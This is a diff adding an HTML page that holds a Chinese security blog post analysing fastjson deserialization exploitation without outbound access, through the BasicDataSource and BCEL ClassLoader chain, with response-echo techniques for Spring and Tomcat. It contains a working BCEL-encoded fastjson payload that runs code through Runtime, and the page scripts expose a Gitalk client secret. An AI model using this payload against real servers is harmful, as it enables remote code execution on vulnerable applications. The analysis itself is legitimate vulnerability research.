@@ -1,0 +1,623 @@
+<!DOCTYPE html>
+<html  lang="zh">
+<head>
+    <meta charset="utf-8" />
+
+<meta name="generator" content="Hexo 3.8.0" />
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+
+<title>fastjson不出网利用简析 - P1ay2win&#39;s blog</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta property="og:site_name" content="P1ay2win's blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="fastjson不出网利用简析 | P1ay2win's blog">
+<meta property="og:image" content="https://blog.play2win.top/2021/11/25/fastjson不出网利用简析/">
+<meta property="twitter:image" content="https://blog.play2win.top/2021/11/25/fastjson不出网利用简析/">
+
+
+
+
+
+
+<link rel="alternative" href="/atom.xml" title="fastjson不出网利用简析" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/images/header.png">
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.7.2/css/bulma.css">
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.4.1/css/all.css">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Ubuntu:400,600|Source+Code+Pro">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css">
+
+
+    
+    
+<style>body>.footer,body>.navbar,body>.section{opacity:0}</style>
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css">
+
+    
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css">
+
+    
+    
+    
+    
+<link rel="stylesheet" href="/css/back-to-top.css">
+
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="/css/progressbar.css">
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+    
+    
+    
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+</head>
+<body class="is-3-column">
+    <nav class="navbar navbar-main">
+    <div class="container">
+        <div class="navbar-brand is-flex-center">
+            <a class="navbar-item navbar-logo" href="/">
+            
+                <img src="/images/header.png" alt="fastjson不出网利用简析" height="28">
+                P1ay2win&#39;s blog
+            
+            </a>
+        </div>
+        <div class="navbar-menu">
+            
+            <div class="navbar-start">
+                
+                <a class="navbar-item"
+                href="/">主页</a>
+                
+                <a class="navbar-item"
+                href="/archives">归档</a>
+                
+                <a class="navbar-item"
+                href="/categories">分类</a>
+                
+                <a class="navbar-item"
+                href="/tags">标签</a>
+                
+            </div>
+            
+            <div class="navbar-end">
+                
+                    
+                    <a class="navbar-item" target="_blank" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                    
+                
+                
+                <a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;">
+                    <i class="fas fa-list-ul"></i>
+                </a>
+                
+                
+                <a class="navbar-item search" title="搜索" href="javascript:;">
+                    <i class="fas fa-search"></i>
+                </a>
+                
+            </div>
+        </div>
+    </div>
+</nav>
+
+    
+    <section class="section">
+        <div class="container">
+            <div class="columns">
+                <div class="column is-8-tablet is-8-desktop is-9-widescreen has-order-2 column-main">
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2021-11-25T03:51:53.000Z">2021-11-25</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/代码审计/">代码审计</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    14 分钟 读完 (大约 2090 个字)
+                </span>
+                
+                
+                    <i class="fa fa-eye"></i> <span id="busuanzi_value_page_pv"></span>次阅读
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                fastjson不出网利用简析
+            
+        </h1>
+        <div class="content">
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>又来炒冷饭啦，做项目终于遇到个fastjson反序列化，但又不想贡献自己的VPS出来搭个JNDI，于是网上找个POC试了下。Duang的一下竟然成功了，执行命令还有回显，有点意思啊，于是开始炒冷饭了。</p>
+<a id="more"></a>
+<h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h2><p>既然是不出网，许多POC中利用JNDI远程加载外部类的方法就无法使用了，不出网的利用需要无需加载类或可通过类属性加载。另一个前提就是获取命令的执行结果，可以将结果写入到web目录，访问该文件获取结果，但更优雅的方式是获取response，将结果从响应信息中输出。</p>
+<h2 id="远程加载类"><a href="#远程加载类" class="headerlink" title="远程加载类"></a>远程加载类</h2><p>目前公开且较为通用的不出网利用链有两条。</p>
+<blockquote>
+<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p>
+<p><code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code></p>
+</blockquote>
+<p><code>TemplatesImpl</code>上一篇文章已经分析过了，反序序列化方法中feature参数需要设置为允许给非公有属性赋值，与<code>BasicDataSource</code>相比就有些鸡肋了。<code>BasicDataSource</code>只需要有<code>dbcp</code>或<code>tomcat-dbcp</code>的依赖即可，dbcp即数据库连接池，在java中用于管理数据库连接，还是挺常见的。</p>
+<p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-17 131613.png" alt></p>
+<p>以下是一个加载恶意类，而恶意类静态代码中有写了<code>Runtime</code>弹计算器的POC，老样子在<code>exec</code>方法处下断点，发现调用栈还是比较钱的，可以从开头开始分析。</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCEL</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;</span><br><span class="line">        String payload2 = <span class="hljs-string">"&#123;\n"</span> +</span><br><span class="line">                <span class="hljs-string">"    &#123;\n"</span> +</span><br><span class="line">                <span class="hljs-string">"        \"x\":&#123;\n"</span> +</span><br><span class="line">                <span class="hljs-string">"                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n"</span> +</span><br><span class="line">                <span class="hljs-string">"                \"driverClassLoader\": &#123;\n"</span> +</span><br><span class="line">                <span class="hljs-string">"                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n"</span> +</span><br><span class="line">                <span class="hljs-string">"                &#125;,\n"</span> +</span><br><span class="line">                <span class="hljs-string">"                \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AuQ$cbN$db$40$U$3d$938$b1c$9c$e6A$D$94$a6o$k$81E$zPw$m6$V$95$aa$baM$d5$m$ba$9eL$a7a$82cG$f6$84$a6_$c4$3a$hZ$b1$e8$H$f0Q$88$3b$sM$pAG$f2$7d$ce9$f7$dc$f1$d5$f5$e5$l$Ao$b0$e1$c2$c1$b2$8b$V$3cr$b0j$fcc$hM$X$F$3c$b1$f1$d4$c63$86$e2$be$8a$94$3e$60$c8$b7$b6$8e$Z$ac$b7$f17$c9P$JT$q$3f$8d$G$5d$99$i$f1nH$95z$Q$L$k$k$f3D$99$7cZ$b4$f4$89J$Z$9a$81$88$H$fep$87$ff$dc$fd$a1$o$ff$3bOu$3f$8d$p$ff$f0L$85$7b$M$ce$be$I$a7C$Y$81$gA$9f$9fq_$c5$fe$fb$f6$e1X$c8$a1VqD$d7$ca$j$cd$c5$e9G$3e$cc$c8I$t$83$db$89G$89$90$ef$94$ZV2t$af$N$d6C$J$ae$8d$e7$k$5e$e0$r$a9$ma$c2$c3$x$ac1$y$de$c3$eda$j$$$c3$ea$ffE2T3$5c$c8$a3$9e$df$ee$f6$a5$d0$M$b5$7f$a5$_$a3H$ab$Bip$7bR$cf$92Fk$x$b8s$87$W$b1$e4X$K$86$cd$d6$5c$b7$a3$T$V$f5$f6$e6$B$9f$93X$c84$r$40eHM$9d$ad$7f$94p$ni$z$9b$7e$9c990$b3$y$d9$F$ca$7c$f2$8c$7ca$fb$X$d8$qk$7bd$8b$b7E$94$c9z$d3$f8$B$w$e4$jTg$60$9e$91$B$f5$df$c8$d5$f3$X$b0$be$9e$c3$f9$b0$7d$81$e2$q$ab$97$I$5b$40$3ec$5c$a2$c8$a0K$844$af$5d$s$96$gE$7f$t$94aQ$5e$a7l$91$3e$h$b9$c0$c6C$8b$g$8dL$d4$d2$N_$9f$94$o$82$C$A$A\"\n"</span> +</span><br><span class="line">                <span class="hljs-string">"        &#125;\n"</span> +</span><br><span class="line">                <span class="hljs-string">"    &#125;: \"x\"\n"</span> +</span><br><span class="line">                <span class="hljs-string">"&#125;"</span>;</span><br><span class="line">        JSON.parse(payload2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-17 135020.png" alt></p>
+<p>直接跟进到<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject</code>，当反序列化的对象为<code>JSONObject</code>时，会调用键的<code>toString</code>方法。此时的键是键为<code>x</code>，值为<code>BasicDataSource</code>对象的<code>JSONObject</code>对象。</p>
+<p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-22 233550.png" alt></p>
+<p>跟进<code>com.alibaba.fastjson.JSON#toString</code>，返回的是它的<code>toJSONString</code>方法的值。接着又套娃调用了三次<code>write</code>方法，来到了<code>com.alibaba.fastjson.serializer.ASMSerializer_1_BasicDataSource#write</code>。IDEA并么有识别出<code>ASMSerializer_1_BasicDataSource</code>的源码，也就是<code>com.alibaba.fastjson.serializer</code>下并没有这个类。</p>
+<p>回到<code>com.alibaba.fastjson.serializer.MapSerializer#write</code>调用<code>serializer</code>属性的<code>getObjectWriter</code>方法处跟进，发现最终调用的是<code>com.alibaba.fastjson.serializer.SerializeConfig#createASMSerializer</code>，<code>ASMSerializerFactory</code>工厂类生成了<code>BasicDataSource</code>的<code>ASMSerializer</code>专属子类<code>ASMSerializer_1_BasicDataSource</code>。</p>
+<p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-23 010928.png" alt></p>
+<p>关于<code>ASMSerializer_1_BasicDataSource</code>这个类，这里就涉及了一个知识点：ASM。</p>
+<blockquote>
+<p>ASM是一个通用的Java字节码操作和分析框架，它可以用来修改现有的类或直接以二进制形式动态生成类。ASM提供了一些常见的字节码转换和分析算法，从中可以构建定制的复杂转换和代码分析工具。ASM提供了与其他Java字节码框架类似的功能，但侧重于性能。因为它的设计和实现都尽可能小和快，所以它非常适合在动态系统中使用（当然也可以以静态方式使用，例如在编译器中）。</p>
+</blockquote>
+<p>生成这个类的<code>write</code>方法中会调用<code>BasicDataSource</code>类的<code>getter</code>方法，其中就有最开始调用栈中的<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#getConnection</code>方法。接着跟进到<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource#createConnectionFactory</code>，当<code>driverClassLoader</code>非空时，会调用<code>loader</code>可控的<code>forName</code>重载方法。</p>
+<p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-23 232731.png" alt></p>
+<p>此时的<code>loader</code>是BCEL的<code>ClassLoader</code>，这是一个神奇的<code>ClassLoader</code>。当反射的类名是<code>$$BCEL$$</code>开头时，会将类名剩余部分解码作为输入流，解析并返回一个Class实例，那么恶意类的静态代码中的恶意代码就会被执行。</p>
+<p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-24 120440.png" alt></p>
+<h2 id="回显"><a href="#回显" class="headerlink" title="回显"></a>回显</h2><p>在网上找到了两串BCEL回显的POC，使用BCEL自带的<code>Utility</code>工具类解码，保存为<code>.class</code>文件就可以用IDEA反编译直接看。解码Demo如下：</p>
+<figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BCELDecode</span> </span>&#123;</span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        String encode = <span class="hljs-string">"$l$8b$I$A$A$A$A$A$A$A..."</span>;</span><br><span class="line">        <span class="hljs-keyword">byte</span>[] decode = Utility.decode(encode,<span class="hljs-keyword">true</span>);</span><br><span class="line">        FileOutputStream fileOutputStream = <span class="hljs-keyword">new</span> FileOutputStream(<span class="hljs-string">"DecodeClass.class"</span>);</span><br><span class="line">        fileOutputStream.write(decode);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>先来看看Spring获取request和response的办法，是一种较为通用的方法。Spring在请求预处理调用<code>processRequest</code>方法的时候，会将request和response放进<code>RequestContextHolder</code>的线程局部变量里，所以当前线程的任何地方都可以取用到request和response。</p>
+<p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-25 103842.png" alt></p>
+<p>在看看tomcat的回显，代码稍长，利用的是c0ny1师傅提出的一种方法，深度优先搜索遍历当前线程的所有属性找到request和response，是tomcat上一种较为通用的回显方法。详细的分析可以在c0ny1的文章：<a href="https://paper.seebug.org/1181/" target="_blank" rel="noopener">半自动化挖掘 request 实现多种中间件回显</a>中看到，这里就不展开说。</p>
+<p><img src="/2021/11/25/fastjson不出网利用简析/屏幕截图 2021-11-25 104728.png" alt></p>
+<p>以上两种方法都用<code>Thread.currentThread().getContextClassLoader()</code>获取上下文类加载器来加载类，个人的理解呢，是因为Java的双亲委派机制。直接使用<code>Class.forName</code>加载的话，在反序列化或加载内存马的点的类加载器是spring和tomcat类的类加载器的parent类加载器，或是与他平行的分支，直接用<code>Class.forName</code>就无法加载到spring和tomcat的类。</p>
+<p><img src="/2021/11/25/fastjson不出网利用简析/169a465deb2c1d96_tplv-t2oaga2asx-watermark.jpg" alt></p>
+<p>而Spring和tomcat又因为不同Web应用不同版依赖本共存、动态加载jsp等一些原因打破了双亲委派机制，会将当前线程的上下文类加载器设置为他们各自的Web应用类加载器，刚好就能通过上下文类加载器加载到想要的Spring和tomcat类。</p>
+<p>以上是个人对上下文类加载器在回显中作用的个人理解，若其中有误，欢用各位师傅斧正。</p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>以上涉及的知识点也就是BCEL的Classloader特性、双亲委派机制和打破双亲委派的方法，好像也没什么，但这段时间的心路历程让我想起来王家卫东邪西毒里的一句</p>
+<blockquote>
+<p>每个人都会经历这个阶段：<br>看见一座山，就想知道山后面是什么。<br>我很想告诉他，<br>可能翻过去山后面，你会发觉没有什么特别。<br>回头看，会觉得这一边更好。<br>但我知道他不会听，<br>以他的性格，自己不试过，又怎么会甘心？</p>
+</blockquote>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" target="_blank" rel="noopener">https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html</a></p>
+<p><a href="https://github.com/depycode/fastjson-local-echo" target="_blank" rel="noopener">https://github.com/depycode/fastjson-local-echo</a></p>
+<p><a href="https://segmentfault.com/a/1190000040160637" target="_blank" rel="noopener">https://segmentfault.com/a/1190000040160637</a></p>
+<p><a href="https://segmentfault.com/a/1190000040188046" target="_blank" rel="noopener">https://segmentfault.com/a/1190000040188046</a></p>
+<p><a href="https://paper.seebug.org/1181/" target="_blank" rel="noopener">https://paper.seebug.org/1181/</a></p>
+
+        </div>
+        
+            <ul class="post-copyright">
+            <li><strong>本文标题：</strong><a href="https://blog.play2win.top/2021/11/25/fastjson不出网利用简析/">fastjson不出网利用简析</a></li>
+            <li><strong>本文作者：</strong><a href="https://blog.play2win.top">P1ay2win</a></li>
+            <li><strong>本文链接：</strong><a href="https://blog.play2win.top/2021/11/25/fastjson不出网利用简析/">https://blog.play2win.top/2021/11/25/fastjson不出网利用简析/</a></li>
+            <li><strong>发布时间：</strong>2021-11-25</li>
+            <li><strong>版权声明：</strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="external nofollow" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明出处！
+            </li>
+            </ul>
+        
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/Spring/">Spring</a>, <a class="has-link-grey -link" href="/tags/tomcat/">tomcat</a>, <a class="has-link-grey -link" href="/tags/内存马/">内存马</a>
+                </div>
+            </div>
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+<div class="card card-transparent">
+    <div class="level post-navigation is-flex-wrap is-mobile">
+        
+        <div class="level-start">
+            <a class="level level-item has-link-grey  article-nav-prev" href="/2021/12/16/log4j漏洞分析/">
+                <i class="level-item fas fa-chevron-left"></i>
+                <span class="level-item">log4j漏洞分析</span>
+            </a>
+        </div>
+        
+        
+        <div class="level-end">
+            <a class="level level-item has-link-grey  article-nav-next" href="/2021/10/31/fastjson反序列化漏洞学习/">
+                <span class="level-item">fastjson反序列化漏洞学习</span>
+                <i class="level-item fas fa-chevron-right"></i>
+            </a>
+        </div>
+        
+    </div>
+</div>
+
+
+
+<div class="card">
+    <div class="card-content">
+        <h3 class="title is-5 has-text-weight-normal">评论</h3>
+        
+<div id="comment-container"></div>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+<script>
+    var gitalk = new Gitalk({
+        clientID: '372fb49f2243341bf93b',
+        clientSecret: 'b79da9cd60cecc3af662428f1daa6e01b1702d75',
+        id: 'cf502e243667425d82e90934d3d6147d',
+        repo: 'p1ay2win.github.io',
+        owner: 'p1ay2win',
+        admin: "p1ay2win",
+        createIssueManually: false,
+        distractionFreeMode: false
+    })
+    gitalk.render('comment-container')
+</script>
+
+
+    </div>
+</div>
+
+</div>
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen  has-order-1 column-left ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <nav class="level">
+            <div class="level-item has-text-centered" style="flex-shrink: 1">
+                <div>
+                    
+                    <figure class="image is-128x128 has-mb-6">
+                        <img class="is-rounded" src="/images/header.png" alt="p1ay2win">
+                    </figure>
+                    
+                    <p class="is-size-4 is-block">
+                        p1ay2win
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-block">
+                        他们的爱与风华，只问自由，只问盛放，只问深情，只问初心，只问勇敢，无问西东。
+                    </p>
+                    
+                    
+                    <p class="is-size-6 is-flex is-flex-center has-text-grey">
+                        <i class="fas fa-map-marker-alt has-mr-7"></i>
+                        <span>CN</span>
+                    </p>
+                    
+                </div>
+            </div>
+        </nav>
+        <nav class="level is-mobile">
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        文章
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        35
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        分类
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        7
+                    </p>
+                </div>
+            </div>
+            <div class="level-item has-text-centered is-marginless">
+                <div>
+                    <p class="heading">
+                        标签
+                    </p>
+                    <p class="title has-text-weight-normal">
+                        31
+                    </p>
+                </div>
+            </div>
+        </nav>
+        
+        <div class="level">
+            <a class="level-item button is-link is-rounded" href="https://p1ay2win.github.io" target="_blank">
+                关注我</a>
+        </div>
+        
+        
+        
+        <div class="level is-mobile">
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Github" href="https://github.com/P1ay2win/">
+                
+                <i class="fab fa-github"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="Twitter" href="https://twitter.com/p1ay2win">
+                
+                <i class="fab fa-twitter"></i>
+                
+            </a>
+            
+            <a class="level-item button is-white is-marginless" target="_blank"
+                title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+            
+        </div>
+        
+    </div>
+</div>
+
+    
+        
+
+    <div class="card widget column-left is-sticky" id="toc">
+        <div class="card-content">
+            <div class="menu">
+                <h3 class="menu-label">
+                    目录
+                </h3>
+                <ul class="menu-list"><li>
+        <a class="is-flex" href="#前言">
+        <span class="has-mr-6">1</span>
+        <span>前言</span>
+        </a></li><li>
+        <a class="is-flex" href="#利用前提">
+        <span class="has-mr-6">2</span>
+        <span>利用前提</span>
+        </a></li><li>
+        <a class="is-flex" href="#远程加载类">
+        <span class="has-mr-6">3</span>
+        <span>远程加载类</span>
+        </a></li><li>
+        <a class="is-flex" href="#回显">
+        <span class="has-mr-6">4</span>
+        <span>回显</span>
+        </a></li><li>
+        <a class="is-flex" href="#后记">
+        <span class="has-mr-6">5</span>
+        <span>后记</span>
+        </a></li><li>
+        <a class="is-flex" href="#参考">
+        <span class="has-mr-6">6</span>
+        <span>参考</span>
+        </a></li></ul>
+            </div>
+        </div>
+    </div>
+
+
+    
+    
+        <div class="column-right-shadow is-hidden-widescreen ">
+        
+        </div>
+    
+</div>
+
+
+                
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    P1ay2win&#39;s blog
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2022 P1ay2win&nbsp;
+                <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>访问量<span id="busuanzi_value_site_pv"></span>次  <i class="fa fa-user-md"></i>  访客数<span id="busuanzi_value_site_uv"></span>人<br>
+                Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & <a
+                        href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://p1ay2win.github.io">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh-CN");</script>
+
+<script>
+var IcarusThemeSettings = {
+    article: {
+        highlight: {
+            clipboard: true,
+            fold: 'unfolded'
+        }
+    }
+};
+</script>
+
+
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+
+
+
+    
+    
+<script src="/js/animation.js"></script>
+
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+<script src="/js/gallery.js" defer></script>
+
+    
+    
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
+</script>
+
+    
+    <script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+    
+    
+<a id="back-to-top" title="回到顶端" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="想要查找什么..." />
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(无标题)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
+</body>
+</html>
